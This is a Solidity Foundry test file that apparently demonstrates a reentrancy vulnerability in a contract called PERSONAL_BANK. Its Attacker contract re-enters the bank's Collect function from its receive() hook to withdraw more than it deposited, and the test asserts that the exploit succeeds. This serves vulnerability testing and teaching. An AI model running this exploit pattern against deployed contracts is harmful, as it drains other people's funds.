
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PERSONAL_BANK} from "../src/PERSONAL_BANK.sol";

contract TestReentrancyPERSONAL_BANK is Test {
    PERSONAL_BANK public bank;
    Attacker public _attacker;

    function setUp() public {
        bank = new PERSONAL_BANK();
        _attacker = new Attacker(address(bank));
        vm.deal(address(bank), 100 ether);
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= 10 ether);

        vm.deal(address(this), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);

        vm.prank(address(_attacker));
        bank.SetMinSum(1 ether);
        bank.Initialized();

        _attacker.setupAttack{value: attackVal}(attackVal);

        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerBalanceBefore = address(_attacker).balance;

        _attacker.attack(attackVal);

        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerBalanceAfter = address(_attacker).balance;

        assertTrue(
            attackerBalanceAfter > attackerBalanceBefore,
            "Attacker balance did not increase"
        );
        assertTrue(
            bankBalanceAfter + (attackerBalanceAfter - attackerBalanceBefore) <= bankBalanceBefore,
            "Conservation check failed"
        );
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack flag not set");
    }

    receive() external payable {}
}

contract Attacker {
    PERSONAL_BANK public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = PERSONAL_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        victim.Collect(val);

        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.Collect(storedAttackVal);
        }
    }
}
